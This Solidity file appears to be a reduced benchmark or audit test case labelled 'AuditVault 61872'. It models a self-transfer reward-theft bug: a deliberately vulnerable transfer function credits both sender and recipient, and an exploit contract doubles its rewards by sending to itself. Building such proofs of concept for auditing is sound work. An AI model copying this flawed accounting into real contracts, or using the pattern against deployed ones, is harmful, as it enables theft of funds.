// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

// AuditVault 61872: Resolv self-transfer reward theft. Reduced local model preserves the reported state transition.

contract Vulnerable {
    mapping(address => uint256) public rewards; function transfer(address to, uint256 amount) external { rewards[msg.sender] += amount; rewards[to] += amount; }
}

contract Exploit {
    Vulnerable public bug;
    bool public success;

    constructor() {
        bug = new Vulnerable();
    }

    function attack() external {
        bug.transfer(address(this), 1); success = bug.rewards(address(this)) == 2;
    }
}


